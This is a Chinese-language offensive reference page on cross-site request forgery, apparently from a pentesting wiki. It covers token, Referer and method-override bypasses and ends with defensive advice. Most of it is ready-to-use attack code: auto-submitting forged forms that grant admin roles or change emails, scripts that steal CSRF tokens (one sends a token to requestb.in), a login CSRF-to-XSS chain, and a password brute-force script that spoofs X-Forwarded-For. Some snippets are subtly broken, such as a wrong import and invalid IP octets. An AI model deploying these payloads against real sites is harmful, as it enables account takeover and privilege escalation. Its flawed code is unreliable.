---
attack_surface: [认证/授权绕过, 客户端利用]
impact: [身份伪造, 完整性破坏, 权限提升]
risk_level: 高
prerequisites:
  - HTTP 协议基础
  - Cookie/Session 机制理解
  - HTML/JavaScript 基础
  - SameSite Cookie 属性认知
difficulty: 初级
related_techniques:
  - cors-bypass
  - xss-cross-site-scripting
  - ssrf-server-side-request-forgery
  - dangling-markup
  - cookie-tossing
tools:
  - Burp Suite Professional
  - XSRFProbe
  - csrf-poc-generator
---

# CSRF — Cross-Site Request Forgery（跨站请求伪造）

> 关联文档：[CORS Bypass](../../../Proxies/CORS%20Bypass/README.md) · [XSS](../../Reflected%20Values/XSS/README.md) · [SSRF](../../Reflected%20Values/SSRF/README.md) · [Dangling Markup](../../Reflected%20Values/Dangling%20Markup/README.md) · [SameSite Cookies](../Cookie%20Attacks/README.md)

---

# 0x01 背景与原理

## 1.1 什么是 CSRF

Cross-Site Request Forgery（CSRF）是一种利用 Web 应用对用户会话的隐式信任进行**跨站请求伪造**的攻击。攻击者诱使已登录受害者在不知情的情况下，向目标应用发送经过精心构造的请求，这些请求会**携带受害者的 Cookie / HTTP Basic Auth 头**，从而以受害者身份执行操作。

**核心矛盾**：浏览器在发起跨域请求时自动附带目标域的所有 Cookie，服务器无法区分这个请求是用户的真实意图还是攻击者的诱导。

```
[受害者浏览器] ----访问恶意页面----> [攻击者服务器]
       │                                    │
       │ 自动携带 target.com 的 Cookie       │ 诱导发起请求
       ↓                                    ↓
[target.com] <----伪造的请求（含受害者会话）---
       │
       执行: 修改密码 / 转账 / 修改邮箱 / ...
```

## 1.2 为什么 Cookie 会被自动携带

HTTP 是无状态协议，Cookie 是 Web 应用最常见的会话维持机制。浏览器的设计原则是：只要请求发往某个域，就会自动附上该域的所有 Cookie（受 SameSite 策略约束）。CSRF 正是利用了这一点——攻击者只需构造一个发往目标域的请求，浏览器就会"好心"地附加受害者在该域的所有 Cookie。

## 1.3 根因

- **Cookie 的隐式认证特性** — 浏览器自动附加 Cookie，无需 JavaScript 显式读取
- **服务端无法区分请求来源** — 缺乏有效的 Origin/Referer 校验或 CSRF Token 机制
- **HTTP 请求可被 HTML 元素自动触发** — `<img>`、`<form>`、`<iframe>` 等标签无需用户确认即可发起跨域请求

---

# 0x02 前提条件

要成功利用 CSRF，需同时满足以下 3 个条件：

1. **识别有价值的操作**：攻击者需找到一个值得利用的端点——如修改密码、修改邮箱、转账、提权等
2. **会话仅通过 Cookie 或 HTTP Basic Auth 管理**：其他 Header（如 `Authorization: Bearer xxx`）无法被浏览器自动附加
3. **请求中无不可预测参数**：若存在攻击者无法获取或猜测的 CSRF Token，攻击将无法进行

**快速检测方法**：在 Burp Suite 中捕获目标请求 → 右键选择 "Copy as fetch" → 检查是否存在 CSRF 保护。

---

# 0x03 攻击分类

- **攻击面**：认证/授权绕过（Authentication/Authorization Bypass）、客户端利用（Client-Side Exploitation）
- **影响维度**：身份伪造（冒充他人执行操作）、完整性破坏（修改数据）、权限提升（修改角色/提权）
- **风险等级**：**高** — 单次用户交互即可完成利用，影响认证类操作

| CSRF 子类型 | 触发方式 | 自动携带 Cookie | 典型场景 |
|------------|---------|----------------|---------|
| **GET-based CSRF** | `<img>`/`<link>`/`<iframe>`/`<script>` | 是（取决于 SameSite） | 修改邮箱、关注用户 |
| **POST-based CSRF** | `<form>` 自动提交 | 取决于 SameSite | 密码修改、角色变更 |
| **JSON CSRF** | `fetch`/`XMLHttpRequest` + CORS 配置 | 需要 `withCredentials` | API 端点 |
| **Stored CSRF** | 存储型 HTML 注入自动触发 | 是 | 富文本编辑器、用户签名 |
| **Login CSRF** | 强制登录到攻击者账户 | 否（登录前无会话） | 登录 CSRF → XSS 链 |
| **WebSocket CSRF** | Socket.IO 跨域连接 | 是（握手阶段） | 实时通信应用 |

---

# 0x04 CSRF 防御机制速查

## 4.1 标准防御措施

| 防御方式 | 原理 | 局限性 |
|---------|------|--------|
| **SameSite Cookies** | 浏览器不在跨站请求中发送 Cookie | `Lax` 仍允许 GET 表单提交和链接导航；`None` 完全失效 |
| **CORS 策略** | 限制跨域 JavaScript 读取响应 | 不影响简单请求（`<form>`/`<img>`），仅限制 JS 读取 |
| **CSRF Token** | 每次请求需携带不可预测的 Token | 需正确绑定到会话；验证逻辑可能被绕过 |
| **Referer/Origin 校验** | 验证请求来源 | 可被绕过（见 0x05.7）；Header 可被策略移除 |
| **用户二次验证** | 输入密码或验证码确认意图 | 影响用户体验；部分实现仍可被绕过 |
| **参数名随机化** | 修改参数名称增加自动化难度 | 安全性依赖于参数的不可预测性 |

## 4.2 常见防御陷阱

- **SameSite=Lax**：仍然允许顶层跨站导航（链接和表单 GET），GET-based CSRF 仍然可能
- **Header 校验遗漏**：只校验存在的 `Origin` Header，若两个 Header 都不存在则放行
- **子串/正则匹配 Referer**：可被 lookalike 域名绕过（如 `mal.net?orig=example.com`、`example.com.mal.net`）
- **`<meta name="referrer" content="never">`**：攻击者可利用该标签完全抑制 Referer 发送
- **方法覆盖绕过**：后端通过 `_method` 参数或覆盖 Header 改变实际 HTTP 方法，但 CSRF 检查仅在 POST 层面进行
- **登录端点无 CSRF 保护**：登录 CSRF 可强制受害者进入攻击者控制的账户

---

# 0x05 防御绕过技术

## 5.1 POST → GET 转换绕过

部分应用仅对 POST 执行 CSRF 校验，对其他 HTTP 方法跳过。典型反模式：

```php
public function csrf_check($fatal = true) {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') return true;  // GET/HEAD 直接绕过
    // ... 验证 CSRF Token ...
}
```

如果目标端点同时接受 `$_REQUEST` 参数（PHP 中同时接收 GET 和 POST），可将 POST 请求转换为 GET 并直接省略 Token：

```http
# 原始 POST（需 Token）
POST /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList HTTP/1.1
Content-Type: application/x-www-form-urlencoded

__csrf_token=sid:...&widgetInfoList=[{"widgetId":"https://attacker<img src onerror=alert(1)>","widgetType":"URL"}]

# Bypass — 切换为 GET（无 Token）
GET /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList&widgetInfoList=[{"widgetId":"https://attacker<img+src+onerror=alert(1)>","widgetType":"URL"}] HTTP/1.1
```

**注意**：此模式常与 Reflected XSS 同时出现——响应被错误地作为 `text/html` 返回而非 `application/json`，可将 CSRF + XSS 合并为一个 GET 链接。

## 5.2 Token 缺失/空值绕过

### 5.2.1 Token 参数缺失

部分实现在 Token **存在时**进行验证，但 Token **缺失时**跳过验证。攻击者直接删除整个 Token 参数即可绕过：

### 5.2.2 Token 值为空

部分实现仅验证 Token 参数是否存在，不验证其内容——空 Token 值也被接受：

```http
POST /admin/users/role HTTP/2
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=guest&role=admin&csrf=
```

**自动提交 PoC（使用 `history.pushState` 隐藏导航痕迹）**：

```html
<html>
  <body>
    <form action="https://example.com/admin/users/role" method="POST">
      <input type="hidden" name="username" value="guest" />
      <input type="hidden" name="role" value="admin" />
      <input type="hidden" name="csrf" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>history.pushState('', '', '/'); document.forms[0].submit();</script>
  </body>
</html>
```

## 5.3 Token 未绑定用户会话

应用从**全局 Token 池**抽取并验证 Token，而非将 Token 绑定到创建它的用户会话。攻击流程：

1. 使用攻击者自己的账户登录应用
2. 获取一个有效的 CSRF Token
3. 在针对受害者的 CSRF 攻击中使用该 Token

Token 验证通过——因为它在全局池中存在，且不与任何特定会话绑定。

## 5.4 HTTP 方法覆盖绕过

当目标使用 "非常规" HTTP 方法（PUT/DELETE/PATCH）时，检查**方法覆盖**功能是否可用。将原始方法改为 POST，使用覆盖参数指定实际方法：

```http
# 方法覆盖 — URL 参数
GET https://example.com/my/dear/api/val/num?_method=PUT

# 方法覆盖 — POST body
POST /users/delete HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&_method=DELETE
```

**常见方法覆盖 Header**：
- `X-HTTP-Method`
- `X-HTTP-Method-Override`
- `X-Method-Override`

**受影响的框架**：Laravel、Symfony、Express 等。开发者在非 POST 方法上跳过 CSRF 检查，因为浏览器原生不支持 `<form>` 发送 PUT/DELETE——但通过方法覆盖，POST 请求仍能达到这些 Handler。

HTML PoC：

```html
<form method="POST" action="/users/delete">
  <input name="username" value="admin">
  <input type="hidden" name="_method" value="DELETE">
  <button type="submit">Delete User</button>
</form>
```

## 5.5 自定义 Header Token 绕过

如果 CSRF 保护通过添加**自定义 Header 中的 Token**实现，测试以下两项：

1. **同时删除自定义 Header 和 Token 值** — 检查应用是否仅当 Header 存在时才验证
2. **使用相同长度但不同内容的 Token** — 检查是否有长度检查逻辑漏洞

## 5.6 Cookie 双提交验证绕过

应用将 CSRF Token **同时存储在 Cookie 和请求参数**中，后端比较两者是否一致。

**攻击前提**：网站存在允许攻击者在受害者浏览器中设置特定 Cookie 的漏洞（如 CRLF Injection、Cookie 注入）。

**攻击流程**：
1. 利用 CRLF / Cookie Set 漏洞设置受害者浏览器中的 `csrf` Cookie 为攻击者确定的值
2. 在 CSRF 攻击请求的 body 参数中使用相同的 Token 值
3. 后端比对 Cookie 中的 Token 与参数中的 Token → 一致 → 验证通过

```html
<html>
  <!-- CSRF PoC -->
  <body>
    <script>history.pushState("", "", "/")</script>
    <form action="https://example.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E"
         onerror="document.forms[0].submit();" />
  </body>
</html>
```

> [!TIP]
> 如果 **CSRF Token 与会话 Cookie 关联**，此攻击无效——因为你需要在受害者浏览器中设置自己的会话 Cookie，这意味着你在攻击你自己。

## 5.7 Content-Type 变换绕过

### 5.7.1 简单请求 Content-Type

根据 [CORS 规范](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests)，POST 请求在以下 Content-Type 下**不会触发 Preflight**：

- `application/x-www-form-urlencoded`
- `multipart/form-data`
- `text/plain`

但后端可能根据 Content-Type **改变处理逻辑**。你应尝试上述值和 `application/json`、`text/xml`、`application/xml`。

### 5.7.2 JSON 数据作为 text/plain 发送

```html
<html>
  <body>
    <form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
      <input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}' />
    </form>
    <script>form.submit()</script>
  </body>
</html>
```

## 5.8 JSON Preflight 绕过

使用 HTML `<form>` 直接发送 `Content-Type: application/json` 是不可能的，使用 `XMLHttpRequest`/`fetch` 会触发 Preflight 请求。以下为绕过策略：

1. **使用替代 Content-Type**：`enctype="text/plain"` 或 `enctype="application/x-www-form-urlencoded"` — 测试后端是否忽略 Content-Type 处理数据
2. **使用复合 Content-Type**：`Content-Type: text/plain; application/json` — 不触发 Preflight，但若后端松散解析可能被识别为 JSON
3. **SWF Flash 文件利用**：使用 Flash 文件发送 `application/json` 请求绕过 Preflight

## 5.9 Referer / Origin 检查绕过

### 5.9.1 抑制 Referer Header

应用可能仅在 Referer Header **存在时**才进行验证。使用以下 HTML 标签完全阻止 Referer 发送：

```html
<meta name="referrer" content="never">
```

### 5.9.2 正则绕过（Lookalike 域名）

如果 Referer 检查使用**子串匹配或正则**，可通过以下方式绕过：

| 绕过方法 | 示例 |
|---------|------|
| URL 以可信域名结尾 | `http://mal.net?orig=http://example.com` |
| URL 以可信域名开头 | `http://example.com.mal.net` |
| URL 路径中包含可信域名 | `http://mal.net/example.com/path` |

### 5.9.3 在 Referer 参数中嵌入域名

```html
<html>
  <head><meta name="referrer" content="unsafe-url" /></head>
  <body>
    <script>history.pushState("", "", "/")</script>
    <form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
      document.forms[0].submit()
    </script>
  </body>
</html>
```

## 5.10 HEAD 方法绕过

部分 Web 路由框架（如 Oak、Express 等）将 **HEAD 请求当作 GET 请求处理**，仅剥离响应 Body 不返回：

```typescript
// Oak router 源码逻辑 (router.ts#L281):
// HEAD 请求被路由到 GET handler，仅移除响应 body
```

当 GET 请求受限时，发送 **HEAD 请求**代替——它将被后端以 GET 方式处理，但可能绕过请求方法层面的 CSRF 检查。

---

# 0x06 利用 Payload 集合

## 6.1 HTML 元素 GET Payload

所有可自动发起 GET 请求且自动携带 Cookie 的 HTML5 元素：

```html
<!-- 基础：隐藏图片 -->
<img src="http://target.com/endpoint?param=VALUE" style="display:none" />

<!-- 所有可用的 HTML5 GET 向量 -->
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="" />
<embed src="..." />
<audio src="...">
  <video src="...">
    <source src="..." type="..." />
    <video poster="...">
      <link rel="stylesheet" href="..." />
      <object data="...">
        <body background="...">
          <div style="background: url('...');"></div>
          <style>body { background: url("..."); }</style>
          <bgsound src="...">
            <track src="..." kind="subtitles" />
            <input type="image" src="..." alt="Submit Button" />
          </bgsound>
        </body>
      </object>
    </video>
  </video>
</audio>
```

**最常用**：`<img>`、`<iframe>`、`<script>`、`<link>`（CSS）、`<input type="image">`。

## 6.2 Form GET 请求

```html
<html>
  <body>
    <script>history.pushState("", "", "/")</script>
    <form method="GET" action="https://victim.net/email/change-email">
      <input type="hidden" name="email" value="some@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit()</script>
  </body>
</html>
```

## 6.3 Form POST 请求（3 种自动提交方式）

```html
<html>
  <body>
    <script>history.pushState("", "", "/")</script>
    <form method="POST" action="https://victim.net/email/change-email" id="csrfform">
      <input type="hidden" name="email" value="some@email.com"
             autofocus onfocus="csrfform.submit();" />  <!-- 方式 1: onfocus 自动提交 -->
      <input type="submit" value="Submit request" />
      <img src="x" onerror="csrfform.submit();" />      <!-- 方式 2: onerror 自动提交 -->
    </form>
    <script>document.forms[0].submit()</script>        <!-- 方式 3: script 自动提交 -->
  </body>
</html>
```

## 6.4 Form POST through iframe（无刷新提交）

请求通过隐藏 iframe 发送，主页面不刷新：

```html
<html>
  <body>
    <iframe style="display:none" name="csrfframe"></iframe>
    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
      <input type="hidden" name="email" value="some@email.com"
             autofocus onfocus="csrfform.submit();" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit()</script>
  </body>
</html>
```

## 6.5 Ajax POST 请求

```javascript
// Vanilla JavaScript
var xh
if (window.XMLHttpRequest) {
  xh = new XMLHttpRequest()                // IE7+, Firefox, Chrome, Opera, Safari
} else {
  xh = new ActiveXObject("Microsoft.XMLHTTP")  // IE6, IE5
}
xh.withCredentials = true
xh.open("POST", "http://challenge01.root-me.org/web-client/ch22/?action=profile")
xh.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
xh.send("username=abcd&status=on")

// jQuery
$.ajax({
  type: "POST",
  url: "https://google.com",
  data: "param=value&param2=value2",
})
```

## 6.6 multipart/form-data POST 请求 (Fetch API)

```javascript
myFormData = new FormData()
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text" })
myFormData.append("newAttachment", blob, "pwned.php")
fetch("http://example/some/path", {
  method: "post",
  body: myFormData,
  credentials: "include",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  mode: "no-cors",
})
```

## 6.7 multipart/form-data 手动构造 Boundary

```javascript
var fileSize = fileData.length,
  boundary = "OWNEDBYOFFSEC",
  xhr = new XMLHttpRequest()
xhr.withCredentials = true
xhr.open("POST", url, true)
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary=" + boundary)
xhr.setRequestHeader("Content-Length", fileSize)
var body = "--" + boundary + "\r\n"
body += 'Content-Disposition: form-data; name="' + nameVar + '"; filename="' + fileName + '"\r\n'
body += "Content-Type: " + ctype + "\r\n\r\n"
body += fileData + "\r\n"
body += "--" + boundary + "--"

xhr.sendAsBinary(body)
```

## 6.8 从页面内 iframe 提交表单

```html
<!-- expl.html -->
<body onload="envia()">
  <form method="POST" id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
    <input type="text" id="pwd" name="pwd" value="otra nueva" />
  </form>
  <body>
    <script>
      function envia() { document.getElementById("formulario").submit() }
    </script>

    <!-- public.html -->
    <iframe src="2-1.html" style="position:absolute;top:-5000"> </iframe>
    <h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
  </body>
</body>
```

## 6.9 窃取 CSRF Token 并发送 POST（Ajax 两步法）

```javascript
function submitFormWithTokenJS(token) {
  var xhr = new XMLHttpRequest()
  xhr.open("POST", POST_URL, true)
  xhr.withCredentials = true
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
      // xhr.responseText
    }
  }
  xhr.send("token=" + token + "&otherparama=heyyyy")
}

function getTokenJS() {
  var xhr = new XMLHttpRequest()
  xhr.responseType = "document"
  xhr.withCredentials = true
  xhr.open("GET", GET_URL, true)
  xhr.onload = function (e) {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
      page = xhr.response
      input = page.getElementById("token")
      submitFormWithTokenJS(input.value)      // 获取 Token → 立即提交
    }
  }
  xhr.send(null)
}

var GET_URL = "http://google.com?param=VALUE"
var POST_URL = "http://google.com?param=VALUE"
getTokenJS()
```

## 6.10 窃取 Token + iframe + Form + Ajax 联合

```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
  <input type="text" name="username" value="AA" />
  <input type="checkbox" name="status" checked="checked" />
  <input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
  function f1() {
    x1 = document.getElementById("i1")
    x1d = x1.contentWindow || x1.contentDocument
    t = x1d.document.getElementById("token").value
    document.getElementById("token").value = t
    document.getElementById("form1").submit()
  }
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE"
        onload="javascript:f1();"></iframe>
```

## 6.11 窃取 Token + iframe + 动态创建 Form

```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500"
        onload="read()"></iframe>

<script>
  function read() {
    var name = "admin2"
    var token = document.getElementById("iframe").contentDocument.forms[0].token.value
    document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php" enctype="multipart/form-data">')
    document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />')
    document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />')
    document.writeln('<input type="submit" name="submit" value="Submit" /><br/>')
    document.writeln('</form>')
    document.forms[0].submit.click()
  }
</script>
```

## 6.12 窃取 Token + 双 iframe 传递

```html
<script>
var token;
function readframe1(){
  token = frame1.document.getElementById("profile").token.value;
  document.getElementById("bypass").token.value = token
  loadframe2();
}
function loadframe2(){
  var test = document.getElementbyId("frame2");
  test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
  sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
  height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
  sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
  height="600" width="800"></iframe>

<body onload="document.forms[0].submit()">
<form id="bypass" name="bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
  <input type="text" name="username" value="z">
  <input type="checkbox" name="status" checked="">
  <input id="token" type="hidden" name="token" value="0000" />
  <button type="submit">Submit</button>
</form>
```

## 6.13 Ajax 窃取 Token + Form POST

```html
<body onload="getData()">
  <form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="username" value="root" />
    <input type="hidden" name="status" value="on" />
    <input type="hidden" id="findtoken" name="token" value="" />
    <input type="submit" value="valider" />
  </form>

  <script>
    var x = new XMLHttpRequest()
    function getData() {
      x.withCredentials = true
      x.open("GET", "http://google.com?param=VALUE", true)
      x.send(null)
    }
    x.onreadystatechange = function () {
      if (x.readyState == XMLHttpRequest.DONE) {
        var token = x.responseText.match(/name="token" value="(.+)"/)[1]
        document.getElementById("findtoken").value = token
        document.getElementById("form").submit()
      }
    }
  </script>
</body>
```

## 6.14 CSRF with Socket.IO

WebSocket 连接在握手阶段同样会自动携带 Cookie，Socket.IO 客户端可被用于 CSRF：

```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
  let socket = io("http://six.jh2i.com:50022/test")

  const username = "admin"

  socket.on("connect", () => {
    console.log("connected!")
    socket.emit("join", {
      room: username,
    })
    socket.emit("my_room_event", {
      data: "!flag",
      room: username,
    })
  })
</script>
```

**原理**：Socket.IO 在建立 WebSocket 连接前的 HTTP 握手阶段携带目标域的 Cookie，服务器据此认证客户端身份，攻击者页面可借此以受害者身份发送 Socket.IO 事件。

---

# 0x07 高级攻击链与联动

## 7.1 Stored CSRF（存储型 CSRF）

当应用允许用户提交 HTML 内容（富文本编辑器、HTML 注入点），将 CSRF Payload 持久化存储到页面中。任何查看该页面的用户自动执行请求：

```html
<!-- 存储型 CSRF — 修改查看者邮箱 -->
<img src="https://example.com/account/settings?newEmail=attacker@example.com" alt="">
```

**增强**：结合全局 CSRF Token（未绑定用户会话）→ 同一 Token 对所有用户有效 → 存储型 CSRF 对所有查看者有效。

## 7.2 Login CSRF → Stored XSS 链

```
[Login CSRF — 强制受害者登录到攻击者账户]
    → [受害者使用攻击者账户浏览应用]
    → [触发存储型 XSS（攻击者提前植入）]
    → [XSS 窃取 Token / 会话劫持 / 权限提升]
```

**Login CSRF PoC**：

```html
<html>
  <body>
    <form action="https://example.com/login" method="POST">
      <input type="hidden" name="username" value="attacker@example.com" />
      <input type="hidden" name="password" value="StrongPass123!" />
      <input type="submit" value="Login" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
      // 可选：跳转到存储型 XSS 所在页面
      // location = 'https://example.com/app/inbox';
    </script>
  </body>
</html>
```

**前提条件**：
- 登录端点无 CSRF 保护（无 Session 级 Token、无 Origin 校验）
- 无用户交互门槛阻止自动登录
- 攻击者账户中有存储型 XSS 载荷

## 7.3 CSRF → Token 窃取（通过 XSS / Dangling Markup）

如果 CSRF Token 存在但可通过其他漏洞获取：

- **XSS 窃取**：[XSS](../Reflected%20Values/XSS/README.md) 可读取页面中的 Token 值并通过外发请求泄露
- **Dangling Markup**：[Dangling Markup Injection](../../Reflected%20Values/Dangling%20Markup/README.md) 可从页面源码泄露后续内容（包括 Token）

## 7.4 CSRF → SSRF（通过 URL 操纵）

当 CSRF 端点接受 URL 参数时，可结合 [SSRF](../../Reflected%20Values/SSRF/README.md) 绕过技术（如 URL 格式变形）进行 Referer/Origin 校验绕过——利用 lookalike URL 或 IP 编码技巧构造合法的 Referer 外观。

---

# 0x08 CSRF Token 环境下的登录暴力破解

在带 CSRF Token 保护但无账户锁定/IP 限制的登录端点，可使用 Python 脚本自动化爆破：

```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
    # 返回 CSRF Token + Session Cookie
    r = requests.get(URL)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
    csrf = csrf.group(1)
    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
    return csrf, session_cookie

def login(user, password):
    print(f"{user}:{password}")
    csrf, cookie = init_session()
    cookies = {SESSION_COOKIE_NAME: cookie}
    data = {
        "tokenCSRF": csrf,
        "username": user,
        "password": password,
        "save": ""
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
    if "Username or password incorrect" in r.text:
        return False
    else:
        print(f"FOUND {user} : {password}")
        return True

with open(PASS_LIST, "r") as f:
    for line in f:
        login(USER, line.strip())
```

**核心要点**：每次登录尝试前**先获取一个新的 CSRF Token**（`init_session()`），因为 CSRF Token 通常绑定到会话或过期时间。

---

# 0x09 工具

| 工具 | 功能 | 链接 |
|------|------|------|
| **XSRFProbe** | 自动化 CSRF 漏洞扫描与 PoC 生成 | [GitHub](https://github.com/0xInfection/XSRFProbe) |
| **csrf-poc-generator** | CSRF PoC HTML 快速生成 | [GitHub](https://github.com/merttasci/csrf-poc-generator) |
| **Burp Suite Professional** | 内置 "Generate CSRF PoC" 功能 | [PortSwigger](https://portswigger.net/burp) |

---

# 0x0A 防御策略

## 10.1 分层防御体系

| 防御层 | 具体措施 | 防护范围 |
|--------|---------|---------|
| **浏览器层** | `SameSite=Strict` / `SameSite=Lax` | 限制 Cookie 在跨站请求中的发送 |
| **应用层 — Token** | 每次会话绑定唯一 CSRF Token（非全局池）；验证 Token 值而非仅检查参数存在性 | 阻止所有未授权请求 |
| **应用层 — Header** | 同时验证 `Origin` 和 `Referer`；两个 Header 都不存在时回退到 Token 验证或拒绝请求 | 防止 Header 抑制绕过 |
| **应用层 — 交互** | 关键操作需密码或验证码二次确认 | 即使 CSRF 成功也无法静默执行 |
| **应用层 — 方法** | 在有效方法（覆盖后）层面检查 CSRF；不仅检查 POST，也覆盖 GET/HEAD/PUT/DELETE | 防止方法覆盖绕过 |

## 10.2 框架级加固

- **登录端点同样实施 CSRF 保护** — 防止 Login CSRF → XSS 链
- **Cookie 双提交验证需防御 Cookie 注入** — 如果同时存在 CRLF 或 Cookie 设置漏洞，双提交模型不安全
- **CORS 正确配置** — `Access-Control-Allow-Origin` 不为 `*` 且配合 `Access-Control-Allow-Credentials: true` 时不过度宽松

## 10.3 开发实践

1. **使用框架内建 CSRF 保护** — Django、Laravel、Spring Security、Ruby on Rails 等均有内建 CSRF 中间件
2. **避免 CSRF 检查仅基于 HTTP 方法** — 不要仅检查 `POST` 而放过其他方法
3. **Token 绑定到用户会话** — 不要使用全局 Token 池
4. **Token 缺失时拒绝请求** — 不要仅在 Token 存在时验证
5. **验证 Referer/Origin 时** — 使用严格比较（完全匹配），不要使用正则或子串匹配

---

# 0x0B 参考资料

- [PortSwigger — CSRF Web Security Academy](https://portswigger.net/web-security/csrf)
- [PortSwigger — Bypassing CSRF Token Validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [PortSwigger — Bypassing Referer-Based CSRF Defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
- [OWASP — Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
- [Wikipedia — Cross-site request forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)
- [MDN — CORS Simple Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests)
- [hahwul — Bypass Referer Check Logic for CSRF](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)
- [YesWeHack — Ultimate Guide to CSRF Vulnerabilities](https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-csrf-vulnerabilities)
- [sicuranext — vtenext 25.02: Three-Way Path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [brycec.me — corCTF 2021 JSON CSRF Challenge](https://brycec.me/posts/corctf_2021_challenges)
- [Google CTF 2023 — vegsoda (HEAD bypass example)](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)
- [Medium (anonymousyogi) — JSON CSRF: CSRF That None Talks About](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)
- [Hackernoon — Blind Attacks: Understanding CSRF](https://hackernoon.com/blind-attacks-understanding-csrf-cross-site-request-forgery)
- [YesWeHack Dojo — Hands-on Labs](https://dojo-yeswehack.com/)
